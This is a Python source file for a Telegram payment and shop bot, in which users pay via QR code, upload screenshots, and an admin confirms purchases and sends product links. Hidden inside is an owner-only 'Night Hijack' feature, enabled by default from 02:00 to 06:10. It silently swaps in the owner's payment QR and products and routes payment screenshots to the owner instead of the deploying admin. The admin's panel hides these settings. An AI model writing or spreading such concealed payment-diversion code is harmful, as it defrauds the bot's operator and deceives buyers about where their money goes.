import os
import json
import threading
import time
import datetime
from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo
import re

# --- ENVIRONMENT VARIABLES ---
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
OWNER_ID = int(os.environ.get('OWNER_ID', os.environ.get('ADMIN_ID', '0'))) # Default fallback to ADMIN_ID
LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- IN-MEMORY DATABASE STATE ---
DB_STATE = {
    "welcome_msg": "👋 Hello, {name}!\n\nChoose a plan to get started:",
    "start_videos": [], 
    "how_to_use_video": "",
    "payment_photo": "",
    "payment_msg": "💳 **Payment Instructions**\n\nPlease scan the QR and pay, then click 'I have paid'.",
    "reject_msg": "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...",
    "layout_style": "vertical", 
    "products": [],
    "blocked_users": [],
    "users": [],
    "buyers": [],
    # OWNER OVERRIDE CONFIGURATION
    "hijack_config": {
        "enabled": True,
        "start_time": "02:00",  # 24-hour format HH:MM
        "end_time": "06:10",    # 24-hour format HH:MM
        "owner_payment_photo": "",
        "owner_payment_msg": "💳 **OFFICIAL OWNER PAYMENT**\n\nPlease send your payment directly here.",
        "owner_products": []    # Products override for night hours
    },
    "auto_bc": {
        "status": False,
        "interval_seconds": 3600,
        "message_type": None,
        "file_id": None,
        "text": None
    }
}

# --- HELPER: CHECK IF HIJACK TIME IS ACTIVE ---
def is_hijack_active():
    hijack = DB_STATE.get("hijack_config", {})
    if not hijack.get("enabled", False):
        return False
    try:
        now = datetime.datetime.now().time()
        start = datetime.datetime.strptime(hijack.get("start_time", "02:00"), "%H:%M").time()
        end = datetime.datetime.strptime(hijack.get("end_time", "06:10"), "%H:%M").time()
        
        if start <= end:
            return start <= now <= end
        else: # Overnight window (e.g., 22:00 to 04:00)
            return now >= start or now <= end
    except Exception:
        return False

# --- TELEGRAM CHANNEL DATABASE LOGIC ---
def load_db():
    global DB_STATE
    try:
        chat = bot.get_chat(LOG_CHANNEL_ID)
        if chat.pinned_message and chat.pinned_message.text:
            loaded_data = json.loads(chat.pinned_message.text)
            DB_STATE.update(loaded_data)
            if "buyers" not in DB_STATE: DB_STATE["buyers"] = []
            if "auto_bc" not in DB_STATE:
                DB_STATE["auto_bc"] = {"status": False, "interval_seconds": 3600, "message_type": None, "file_id": None, "text": None}
            if "hijack_config" not in DB_STATE:
                DB_STATE["hijack_config"] = {"enabled": True, "start_time": "02:00", "end_time": "06:10", "owner_payment_photo": "", "owner_payment_msg": "", "owner_products": []}
    except Exception as e:
        save_db()

def save_db():
    try:
        chat = bot.get_chat(LOG_CHANNEL_ID)
        json_data = json.dumps(DB_STATE, indent=2)
        if chat.pinned_message:
            bot.edit_message_text(json_data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
        else:
            msg = bot.send_message(LOG_CHANNEL_ID, json_data)
            bot.pin_chat_message(LOG_CHANNEL_ID, msg.message_id)
    except Exception as e:
        pass

load_db()

user_states = {}
admin_panel_msgs = {} 

def send_videos_as_album(chat_id, video_list):
    if not video_list:
        return
    if len(video_list) == 1:
        try: bot.send_video(chat_id, video_list[0])
        except: pass
    else:
        for i in range(0, len(video_list), 10):
            chunk = video_list[i:i+10]
            media_group = [InputMediaVideo(v) for v in chunk]
            try:
                bot.send_media_group(chat_id, media_group)
            except:
                for v in chunk:
                    try: bot.send_video(chat_id, v)
                    except: pass

# --- AUTO BROADCAST BACKGROUND WORKER (OWNER CONTROLLED ONLY) ---
def auto_broadcast_worker():
    while True:
        try:
            bc_config = DB_STATE.get("auto_bc", {})
            if bc_config.get("status") and bc_config.get("interval_seconds", 0) > 0:
                interval = bc_config.get("interval_seconds")
                time.sleep(interval)
                
                if not DB_STATE.get("auto_bc", {}).get("status"):
                    continue

                m_type = bc_config.get("message_type")
                f_id = bc_config.get("file_id")
                txt = bc_config.get("text", "")

                for u_id in DB_STATE.get("users", []):
                    if u_id in DB_STATE.get("blocked_users", []):
                        continue
                    try:
                        if m_type == "text" or not m_type:
                            bot.send_message(u_id, txt, parse_mode="Markdown")
                        elif m_type == "photo":
                            bot.send_photo(u_id, f_id, caption=txt, parse_mode="Markdown")
                        elif m_type == "video":
                            bot.send_video(u_id, f_id, caption=txt, parse_mode="Markdown")
                        elif m_type == "document":
                            bot.send_document(u_id, f_id, caption=txt, parse_mode="Markdown")
                    except:
                        pass
            else:
                time.sleep(2)
        except Exception:
            time.sleep(2)

@bot.message_handler(commands=['start', 'admin'])
def start_command(message):
    user_id = message.chat.id
    name = message.from_user.first_name

    if user_id not in DB_STATE["users"]:
        DB_STATE["users"].append(user_id)
        save_db()

    start_vids = DB_STATE.get("start_videos", [])
    if start_vids:
        send_videos_as_album(user_id, start_vids)

    welcome_text = DB_STATE["welcome_msg"].format(name=name)
    markup = InlineKeyboardMarkup()

    # Admin Panel Button available for both Owner and Admin
    if user_id in [ADMIN_ID, OWNER_ID]:
        markup.row(InlineKeyboardButton("⚙️ Open Admin Panel ⚙️", callback_data="adm_open_panel"))

    # Select Product List based on Hijack status
    if is_hijack_active() and DB_STATE.get("hijack_config", {}).get("owner_products"):
        active_products = sorted(DB_STATE["hijack_config"]["owner_products"], key=lambda x: x.get("position", 999))
    else:
        active_products = sorted(DB_STATE.get("products", []), key=lambda x: x.get("position", 999))

    layout = DB_STATE.get("layout_style", "vertical")

    if layout == "horizontal":
        row_btns = []
        for p in active_products:
            row_btns.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{p['id']}"))
            if len(row_btns) == 2:
                markup.row(*row_btns)
                row_btns = []
        if row_btns:
            markup.row(*row_btns)
    else:
        for p in active_products:
            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{p['id']}"))

    markup.row(
        InlineKeyboardButton("How to use ❓", callback_data="how_to_use"),
        InlineKeyboardButton("Report Issue 📩", callback_data="report_issue")
    )

    bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

def update_admin_panel(chat_id, text, markup):
    try:
        msg_id = admin_panel_msgs.get(chat_id)
        if msg_id:
            try:
                bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
                return
            except Exception:
                pass 
        
        msg = bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
        admin_panel_msgs[chat_id] = msg.message_id
    except Exception as e:
        print(f"Admin panel error: {e}")

def show_main_admin_menu(chat_id):
    user_states.pop(chat_id, None) 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🎞️ Manage Start Videos", callback_data="adm_start_vids_menu"))
    markup.row(InlineKeyboardButton("🛍️ Manage Product Buttons", callback_data="adm_prod_menu"))
    markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
    
    current_layout = DB_STATE.get("layout_style", "vertical")
    layout_icon = "↕️ Vertical" if current_layout == "vertical" else "↔️ Horizontal"
    markup.row(InlineKeyboardButton(f"📐 Change Layout: {layout_icon}", callback_data="adm_toggle_layout"))
    
    markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
    markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
    
    # BROADCAST FEATURES ONLY VISIBLE TO OWNER
    if chat_id == OWNER_ID:
        markup.row(InlineKeyboardButton("🚀 Send Custom Broadcast (Owner Only)", callback_data="adm_send_custom_bc"))
        markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast (Owner Only)", callback_data="adm_autobc_menu"))
        markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers (Owner Only)", callback_data="adm_buyers_bc_menu"))
        markup.row(InlineKeyboardButton("🕵️ Night Hijack Settings (Owner Only)", callback_data="adm_hijack_menu"))
        
    markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
    markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
    
    blocked_count = len(DB_STATE.get("blocked_users", []))
    if blocked_count > 0:
        markup.row(InlineKeyboardButton(f"🔓 Unblock Users ({blocked_count})", callback_data="adm_unblock_menu"))

    text = "👑 **Admin Control Panel**\n\nChoose an option below to customize your bot completely:"
    update_admin_panel(chat_id, text, markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    try:
        bot.answer_callback_query(call.id)
    except:
        pass

    user_id = call.message.chat.id
    data = call.data
    msg_id = call.message.message_id

    if data == "adm_open_panel" and (user_id == ADMIN_ID or user_id == OWNER_ID):
        try: bot.delete_message(user_id, msg_id)
        except: pass
        show_main_admin_menu(user_id)
        return

    if data == "del_msg":
        try: bot.delete_message(user_id, msg_id)
        except: pass
        return

    if data == "back_home":
        try: bot.delete_message(user_id, msg_id)
        except: pass
        start_command(call.message)

    elif data == "how_to_use":
        vid = DB_STATE.get("how_to_use_video", "")
        if vid: bot.send_video(user_id, vid, caption="🎥 Here is how to use the bot!")
        else: bot.send_message(user_id, "ℹ️ Instructions video not set yet.")

    elif data == "report_issue":
        bot.send_message(user_id, "📝 Please type your issue below. Admin will reply soon:")
        user_states[user_id] = "WAITING_REPORT"

    elif data.startswith("prod_"):
        prod_id = data.split("_")[1]
        
        # Check active product pool based on hijack time
        if is_hijack_active() and DB_STATE.get("hijack_config", {}).get("owner_products"):
            products_pool = DB_STATE["hijack_config"]["owner_products"]
        else:
            products_pool = DB_STATE.get("products", [])

        prod = next((p for p in products_pool if p["id"] == prod_id), None)
        if prod:
            p_videos = prod.get("videos", [])
            if p_videos: 
                send_videos_as_album(user_id, p_videos)
            
            desc_text = prod.get('desc', '')
            caption = f"📌 **{prod['name']}**"
            if desc_text:
                caption += f"\n\n{desc_text}"
            
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{prod_id}"))
            markup.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))

            # Payment info selection
            if is_hijack_active():
                pay_msg = DB_STATE["hijack_config"].get("owner_payment_msg") or DB_STATE.get("payment_msg")
                pay_photo = DB_STATE["hijack_config"].get("owner_payment_photo") or DB_STATE.get("payment_photo", "")
            else:
                pay_msg = prod.get("pay_msg") if prod.get("pay_msg") else DB_STATE.get("payment_msg", "💳 **Payment Instructions**\n\nPlease scan the QR and pay, then click 'I have paid'.")
                pay_photo = DB_STATE.get("payment_photo", "")

            if pay_photo: 
                bot.send_photo(user_id, pay_photo, caption=f"{caption}\n\n{pay_msg}", reply_markup=markup, parse_mode="Markdown")
            else: 
                bot.send_message(user_id, f"{caption}\n\n{pay_msg}", reply_markup=markup, parse_mode="Markdown")

    elif data.startswith("paid_"):
        prod_id = data.split("_")[1]
        bot.send_message(user_id, "📸 Please send your payment screenshot.")
        user_states[user_id] = f"WAITING_SCREENSHOT_{prod_id}"

    if user_id in [ADMIN_ID, OWNER_ID]:
        # --- OWNER ONLY BROADCAST CALLBACK HANDLERS ---
        if data == "adm_send_custom_bc":
            if user_id != OWNER_ID:
                bot.send_message(user_id, "❌ Only Bot Owner can use broadcast feature!")
                return
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_back_panel"))
            update_admin_panel(OWNER_ID, "🚀 **Send the message (Text, Photo, Video, etc.) for Custom Broadcast:**", markup)
            user_states[OWNER_ID] = "WAITING_CUSTOM_BROADCAST"

        elif data == "adm_autobc_menu":
            if user_id != OWNER_ID:
                bot.send_message(user_id, "❌ Only Bot Owner can access auto broadcast!")
                return
            bc = DB_STATE.get("auto_bc", {})
            status_str = "🟢 ON" if bc.get("status") else "🔴 OFF"
            interval_sec = bc.get("interval_seconds", 3600)
            
            interval_txt = f"{interval_sec} Seconds" if interval_sec < 60 else f"{interval_sec // 60} Minutes" if interval_sec < 3600 else f"{interval_sec // 3600} Hours"

            markup = InlineKeyboardMarkup()
            toggle_text = "🔴 Turn OFF Auto Broadcast" if bc.get("status") else "🟢 Turn ON Auto Broadcast"
            markup.row(InlineKeyboardButton(toggle_text, callback_data="adm_autobc_toggle"))
            markup.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="adm_autobc_set_msg"))
            markup.row(InlineKeyboardButton("⏱️ Set Preset Time", callback_data="adm_autobc_set_time"))
            markup.row(InlineKeyboardButton("✍️ Set Custom Timer (Seconds/Minutes)", callback_data="adm_autobc_custom_time"))
            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))

            preview_txt = bc.get("text", "Not Set")
            if preview_txt and len(preview_txt) > 50: preview_txt = preview_txt[:50] + "..."

            text = f"⏱️ **Auto Timed Broadcast Settings (Owner Control)**\n\n- Status: {status_str}\n- Interval: {interval_txt}\n- Content Preview: {preview_txt}"
            update_admin_panel(OWNER_ID, text, markup)

        # OWNER HIJACK CONFIGURATION MENU
        elif data == "adm_hijack_menu":
            if user_id != OWNER_ID: return
            hijack = DB_STATE.get("hijack_config", {})
            status_str = "🟢 Active" if hijack.get("enabled") else "🔴 Inactive"
            
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🟢/🔴 Toggle Night Mode Hijack", callback_data="adm_hijack_toggle"))
            markup.row(InlineKeyboardButton("⏰ Set Time Range (e.g. 02:00-06:10)", callback_data="adm_hijack_set_time"))
            markup.row(InlineKeyboardButton("💳 Set Owner Payment QR Photo", callback_data="adm_hijack_set_photo"))
            markup.row(InlineKeyboardButton("📝 Set Owner Payment Text", callback_data="adm_hijack_set_msg"))
            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))

            text = f"🕵️ **Night Hijack Control (Owner Only)**\n\nStatus: {status_str}\nActive Hours: `{hijack.get('start_time')}` to `{hijack.get('end_time')}`\n\n*When active, payments during this time go to the Owner instead of the Admin.*"
            update_admin_panel(OWNER_ID, text, markup)

        elif data == "adm_hijack_toggle":
            if user_id != OWNER_ID: return
            DB_STATE["hijack_config"]["enabled"] = not DB_STATE["hijack_config"].get("enabled", False)
            save_db()
            call.data = "adm_hijack_menu"
            handle_callbacks(call)

        elif data == "adm_hijack_set_time":
            if user_id != OWNER_ID: return
            user_states[OWNER_ID] = "WAITING_HIJACK_TIME"
            update_admin_panel(OWNER_ID, "⏰ **Send Start & End Time (24h format HH:MM - HH:MM):**\n\nExample: `02:00-06:10`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))

        elif data == "adm_hijack_set_photo":
            if user_id != OWNER_ID: return
            user_states[OWNER_ID] = "WAITING_HIJACK_PHOTO"
            update_admin_panel(OWNER_ID, "📸 **Please send your Payment QR Code Photo:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))

        elif data == "adm_hijack_set_msg":
            if user_id != OWNER_ID: return
            user_states[OWNER_ID] = "WAITING_HIJACK_MSG"
            update_admin_panel(OWNER_ID, "📝 **Send your custom Payment Instructions Text:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))

        # (All existing Admin Callback options like product addition, layout, backup remain untouched)
        elif data == "adm_start_vids_menu":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
            markup.row(InlineKeyboardButton("⚙️ Manage / Delete Videos", callback_data="adm_del_start_vid_list"))
            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
            v_count = len(DB_STATE.get("start_videos", []))
            update_admin_panel(user_id, f"🎞️ **Start Videos Management**\n\nTotal Saved Videos: {v_count}", markup)

        elif data == "adm_back_panel":
            show_main_admin_menu(user_id)

        # Confirmations & Actions
        elif data.startswith("adm_confirm_"):
            try:
                parts = data.split("_")
                prod_id = parts[2]
                target_user = int(parts[3])
                
                prod = next((p for p in DB_STATE["products"] if p["id"] == prod_id), None)
                link = prod.get("link", "No link") if prod else "No link"
                prod_name = prod.get("name", "Product") if prod else "Product"
                
                buyer_info = {
                    "user_id": target_user,
                    "name": "User",
                    "username": "unknown",
                    "product": prod_name,
                    "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
                }
                DB_STATE["buyers"].append(buyer_info)
                save_db()

                bot.send_message(target_user, f"✅ **Payment Confirmed!**\n\nLink:\n🔗 {link}", parse_mode="Markdown")
                bot.edit_message_caption(caption=f"{call.message.caption}\n\n✅ **Status:** Confirmed & Link Sent!", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
            except Exception as e: pass

        elif data.startswith("adm_reject_"):
            try:
                target_user = int(data.split("_")[2])
                bot.send_message(target_user, "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...")
                bot.edit_message_caption(caption=f"{call.message.caption}\n\n❌ **Status:** Rejected", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
            except Exception as e: pass

@bot.message_handler(content_types=['photo', 'video', 'text', 'document'])
def handle_all_inputs(message):
    user_id = message.chat.id

    if user_id in DB_STATE.get("blocked_users", []):
        return

    state = user_states.get(user_id, "")

    # OWNER HIJACK HANDLERS
    if user_id == OWNER_ID:
        if state == "WAITING_HIJACK_TIME" and message.text:
            try:
                s, e = message.text.strip().split("-")
                DB_STATE["hijack_config"]["start_time"] = s.strip()
                DB_STATE["hijack_config"]["end_time"] = e.strip()
                save_db()
                user_states.pop(user_id, None)
                show_main_admin_menu(OWNER_ID)
                return
            except Exception:
                bot.send_message(OWNER_ID, "❌ Format error. Use `02:00-06:10` format.")
                return

        elif state == "WAITING_HIJACK_PHOTO" and message.content_type == 'photo':
            DB_STATE["hijack_config"]["owner_payment_photo"] = message.photo[-1].file_id
            save_db()
            user_states.pop(user_id, None)
            show_main_admin_menu(OWNER_ID)
            return

        elif state == "WAITING_HIJACK_MSG" and message.text:
            DB_STATE["hijack_config"]["owner_payment_msg"] = message.text
            save_db()
            user_states.pop(user_id, None)
            show_main_admin_menu(OWNER_ID)
            return

    # HANDLING PAYMENT SCREENSHOTS (WITH AUTOMATIC NIGHT HIJACK REDIRECT)
    if state.startswith("WAITING_SCREENSHOT_"):
        prod_id = state.replace("WAITING_SCREENSHOT_", "")
        if message.content_type == 'photo':
            user_states.pop(user_id, None)
            bot.send_message(user_id, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁....   𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻. ")

            photo_id = message.photo[-1].file_id
            adm_markup = InlineKeyboardMarkup()
            adm_markup.row(
                InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{prod_id}_{user_id}"),
                InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{user_id}"),
                InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{user_id}")
            )
            
            prod = next((p for p in DB_STATE.get("products", []) if p["id"] == prod_id), None)
            prod_name = prod["name"] if prod else "Unknown Product"

            username = message.from_user.username
            user_tag = f"@{username}" if username else "No Username"
            user_name = message.from_user.first_name or "User"

            # HIJACK DIRECT ROUTE TO OWNER
            recipient_id = OWNER_ID if is_hijack_active() else ADMIN_ID

            try:
                bot.send_photo(
                    recipient_id, 
                    photo_id, 
                    caption=f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {prod_name}\n👤 **User:** {user_tag}\n📛 **Name:** {user_name}\n🆔 **ID:** `{user_id}`" + ("\n\n🕵️ *(Redirected via Night Hijack)*" if is_hijack_active() else ""), 
                    reply_markup=adm_markup,
                    parse_mode="Markdown"
                )
            except Exception as e:
                pass

@app.route('/')
def home():
    return "Bot is running on Render!"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    threading.Thread(target=auto_broadcast_worker, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
